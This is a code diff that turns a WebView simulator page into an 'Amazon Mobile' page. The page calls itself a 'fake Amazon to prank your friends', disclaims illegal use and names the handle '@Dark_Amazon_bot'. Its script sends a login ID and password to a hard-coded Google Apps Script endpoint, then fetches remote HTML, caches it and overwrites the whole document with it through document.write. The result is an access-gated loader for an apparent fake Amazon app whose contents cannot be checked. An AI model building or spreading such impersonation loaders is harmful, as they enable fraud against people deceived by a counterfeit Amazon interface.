@@ -1,159 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mobile WebView Simulator</title>
-    <style>
-        /* Base Reset & Setup */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        html, body {
-            width: 100%;
-            height: 100%;
-            background-color: #121212;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Amazon Mobile</title>
+  
+  <!-- CryptoJS for Client-Side AES Encryption -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  
+  <style>
+    /* Global Reset */
+    html, body {
+      margin: 0; padding: 0; width: 100%; height: 100vh; overflow: hidden; font-family: "Amazon Ember", Arial, sans-serif;
+    }
+    
+    /* EXACT LOGIN UI CSS FROM MAIN.HTML */
+    #login-overlay { 
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 3000; 
+      display: none; justify-content: center; align-items: center; flex-direction: column; 
+    }
+    .login-new-user-bg { 
+      background: linear-gradient(135deg, #000000, #1a0b2e, #001f3f); color: white; 
+      width: 100%; height: 100%; display: flex; flex-direction: column; 
+      align-items: center; justify-content: center; padding: 20px; box-sizing: border-box;
+    }
+    .login-warning { 
+      color: #ff3333; font-size: 2rem; font-weight: 900; margin-bottom: 10px; 
+      letter-spacing: 2px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); 
+    }
+    .login-note { 
+      text-align: center; color: #e6f3ff; font-size: 0.9rem; margin-bottom: 30px; 
+      max-width: 300px; line-height: 1.4; 
+    }
+    .login-anim-text { 
+      font-size: 1.5rem; font-weight: bold; background: linear-gradient(90deg, #007bff, #b19cd9, #87ceeb); 
+      -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 15px; 
+      animation: textFlow 3s infinite linear; 
+    }
+    @keyframes textFlow { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
 
-        /* Mock Mobile Device Container */
-        .device-wrapper {
-            width: 100%;
-            max-width: 412px; /* Standard mobile width break */
-            height: 100%;
-            max-height: 892px; /* Standard mobile height break */
-            background-color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0px 10px 40px rgba(0, 0, 0, 0.5);
-            border-radius: 24px;
-            overflow: hidden;
-            border: 4px solid #2d2d2d;
-            position: relative;
-        }
+    .social-icons { display: flex; gap: 20px; margin-bottom: 30px; }
+    .social-icon svg { width: 32px; height: 32px; fill: #87ceeb; filter: drop-shadow(0 0 5px #007bff); }
 
-        /* WebView Top App Navigation Bar Bar */
-        .webview-header {
-            background-color: #f8f9fa;
-            border-bottom: 1px solid #e9ecef;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            z-index: 10;
-        }
-        .nav-btn {
-            background: none;
-            border: none;
-            font-size: 16px;
-            cursor: pointer;
-            color: #495057;
-            padding: 4px;
-        }
-        .address-bar {
-            flex: 1;
-            background-color: #e9ecef;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            color: #6c757d;
-            text-align: center;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
+    .input-group-login { width: 100%; max-width: 300px; margin-bottom: 15px; position: relative; }
+    .input-group-login input { 
+      width: 100%; padding: 12px; background: rgba(255,255,255,0.1); border: 1px solid #007bff; 
+      color: white; border-radius: 8px; outline: none; transition: box-shadow 0.3s; box-sizing: border-box;
+    }
+    .input-group-login input::placeholder { color: #aaa; }
+    .input-group-login input:focus { box-shadow: 0 0 15px rgba(0, 123, 255, 0.5); }
+    
+    .pass-group { display: flex; align-items: center; }
+    .eye-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; font-size: 1.2rem; }
 
-        /* The Viewport Box Container */
-        .webview-body {
-            flex: 1;
-            position: relative;
-            background-color: #fff;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            display: block;
-        }
-
-        /* Desktop Browser Block Warning Screen Overlay */
-        .browser-warning {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.98);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 24px;
-            text-align: center;
-            z-index: 5;
-        }
-        .warning-card h3 {
-            color: #dc3545;
-            margin-bottom: 12px;
-            font-size: 18px;
-        }
-        .warning-card p {
-            color: #6c757d;
-            font-size: 13px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .action-btn {
-            background-color: #0d6efd;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-        }
-    </style>
+    .login-btn-anim { 
+      width: 100%; max-width: 300px; padding: 12px; background: linear-gradient(90deg, #007bff, #6610f2); 
+      border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 1rem; cursor: pointer; 
+      position: relative; overflow: hidden; box-shadow: 0 4px 15px rgba(0,123,255,0.4); 
+    }
+    .login-btn-anim:active { transform: scale(0.98); }
+    .login-btn-anim:disabled { opacity: 0.6; cursor: not-allowed; }
+  </style>
 </head>
 <body>
 
-    <div class="device-wrapper">
-        <!-- Mock Browser/App Header -->
-        <div class="webview-header">
-            <button class="nav-btn" onclick="alert('WebView Back Hook Called')">◀</button>
-            <div class="address-bar">🔒 https://www.gyftr.com/</div>
-            <button class="nav-btn" onclick="document.getElementById('target-frame').src='https://www.gyftr.com/'">🔄</button>
+  <!-- EXACT LOGIN UI FROM MAIN.HTML -->
+  <div id="login-overlay">
+    <div id="login-state-new" class="login-new-user-bg">
+        <div class="login-warning">WARNING</div>
+        <div class="login-note">
+            This is fake Amazon to prank your friends , if you are using this illegally that's your responsibility .
         </div>
-
-        <!-- WebView Window Frame Content Container -->
-        <div class="webview-body">
-            <iframe id="target-frame" src="https://www.gyftr.com/"></iframe>
-            
-            <!-- Standard Web Security Interceptor Notice Shield -->
-            <div id="security-notice" class="browser-warning">
-                <div class="warning-card">
-                    <h3>Standard Web Browser Detected</h3>
-                    <p>Because you are loading this single HTML file inside a standard desktop web browser, Gyftr's server settings (X-Frame-Options) will block the connection inside an iframe element for anti-clickjacking safety.</p>
-                    <p><strong>To make it work:</strong> Compile this exact single file into a hybrid wrapper like Apache Cordova, Capacitor, or a Native Android/iOS WebView shell application context.</p>
-                    <button class="action-btn" onclick="window.open('https://www.gyftr.com/', '_blank')">Open Directly Outside Frame</button>
-                </div>
+        <div class="login-anim-text">@Dark_Amazon_bot</div>
+        
+        <div class="social-icons">
+            <div class="social-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.16.16-.295.293-.605.293l.213-3.053 5.56-5.022c.242-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.941z"/></svg>
             </div>
         </div>
-    </div>
 
-    <script>
-        // Automatic runtime evaluation routine
-        // If loaded within a true hybrid mobile package container, standard desktop protection overlays drop away
-        const isMobileWebView = navigator.userAgent.includes("wv") || navigator.userAgent.includes("Cordova") || window.Android;
-        if (isMobileWebView) {
-            document.getElementById('security-notice').style.display = 'none';
+        <div class="input-group-login">
+            <input type="text" id="login-id" placeholder="User ID">
+        </div>
+        
+        <div class="input-group-login pass-group">
+            <input type="password" id="login-pass" placeholder="Password">
+            <span id="toggle-pass" class="eye-icon">👁️</span>
+        </div>
+        
+        <button id="login-btn" class="login-btn-anim">Log In</button>
+        <p id="login-msg" style="color: #ff3333; margin-top: 10px; font-weight: bold;"></p>
+    </div>
+  </div>
+
+  <script>
+    // ---------------- CONFIGURATION ----------------
+    // Apna Google Apps Script Web App URL daalen (Backend same rahega)
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyPMxLV19U9tRQHpcV9k6Kma-cHwF-rdFSLRZKCMslHyMLIznY17bA2P-vv7W8zXBs93A/exec";
+    
+    // Key used to store HTML in localStorage
+    const STORAGE_KEY = "cached_html_content";
+    // -----------------------------------------------
+
+    // Password visibility toggle logic
+    document.getElementById('toggle-pass').addEventListener('click', () => {
+        const passInput = document.getElementById('login-pass');
+        if (passInput.type === 'password') { 
+            passInput.type = 'text'; 
+            document.getElementById('toggle-pass').textContent = '🙈'; 
+        } else { 
+            passInput.type = 'password'; 
+            document.getElementById('toggle-pass').textContent = '👁️'; 
         }
-    </script>
+    });
+
+    // --- STEP 1: Initial Load & LocalStorage Check ---
+    window.onload = function() {
+      const storedHtml = localStorage.getItem(STORAGE_KEY);
+      if (storedHtml) {
+        // App cached -> inject natively
+        injectDirectly(storedHtml);
+      } else {
+        // App not cached -> Show Login Screen
+        document.getElementById('login-overlay').style.display = 'flex';
+      }
+    };
+
+    // --- STEP 2: Authentication ---
+    document.getElementById('login-btn').addEventListener('click', async () => {
+      const id = document.getElementById('login-id').value.trim();
+      const password = document.getElementById('login-pass').value.trim();
+      const statusMsg = document.getElementById('login-msg');
+      const btn = document.getElementById('login-btn');
+
+      if (!id || !password) {
+        statusMsg.style.color = "#ff3333";
+        statusMsg.innerText = "Please enter both ID and Password.";
+        return;
+      }
+
+      statusMsg.style.color = "#87ceeb";
+      statusMsg.innerText = "Authenticating with server...";
+      btn.innerText = "Please Wait...";
+      btn.disabled = true;
+
+      try {
+        const response = await fetch(WEB_APP_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: JSON.stringify({ id: id, password: password })
+        });
+
+        const result = await response.json();
+
+        if (result.success && result.url) {
+          statusMsg.style.color = "#28a745";
+          statusMsg.innerText = "Success! Fetching App Content...";
+          await fetchAndCacheContent(result.url);
+        } else {
+          statusMsg.style.color = "#ff3333";
+          statusMsg.innerText = result.message || "Invalid credentials.";
+          btn.innerText = "Log In";
+          btn.disabled = false;
+        }
+
+      } catch (error) {
+        statusMsg.style.color = "#ff3333";
+        statusMsg.innerText = "Network Error. Please try again.";
+        btn.innerText = "Log In";
+        btn.disabled = false;
+      }
+    });
+
+    // --- STEP 3: Fetching & Caching ---
+    async function fetchAndCacheContent(githubRawUrl) {
+      const statusMsg = document.getElementById('login-msg');
+      const btn = document.getElementById('login-btn');
+
+      try {
+        const githubResponse = await fetch(githubRawUrl);
+        if (!githubResponse.ok) throw new Error(`GitHub Error: ${githubResponse.status}`);
+
+        const htmlContent = await githubResponse.text();
+
+        // Save safely
+        localStorage.setItem(STORAGE_KEY, htmlContent);
+
+        // NATIVE INJECTION (NO IFRAME)
+        injectDirectly(htmlContent);
+
+      } catch (error) {
+        statusMsg.style.color = "#ff3333";
+        statusMsg.innerText = "Failed to download app content.";
+        btn.innerText = "Log In";
+        btn.disabled = false;
+      }
+    }
+
+    // --- STEP 4: DIRECT DOM INJECTION (THE ULTIMATE FIX) ---
+    function injectDirectly(htmlContent) {
+      // 1. Rewrite the ENTIRE document (this places your app in the TOP LEVEL window)
+      // This fixes: Native Share API, Back Button Routing, and Log Out functionality.
+      document.open();
+      document.write(htmlContent);
+      document.close();
+
+      // 2. THE MAGIC TRICK for main.html
+      // Because document.write bypasses the normal page load cycle,
+      // the DOMContentLoaded event in your main.html never fires originally.
+      // We manually dispatch this event so all your 3000+ lines of JS start working instantly!
+      setTimeout(() => {
+        const event = document.createEvent("Event");
+        event.initEvent("DOMContentLoaded", true, true);
+        window.document.dispatchEvent(event);
+        window.dispatchEvent(new Event('load'));
+      }, 50); // Small 50ms delay to let the browser parse the DOM
+    }
+  </script>
 </body>
 </html>
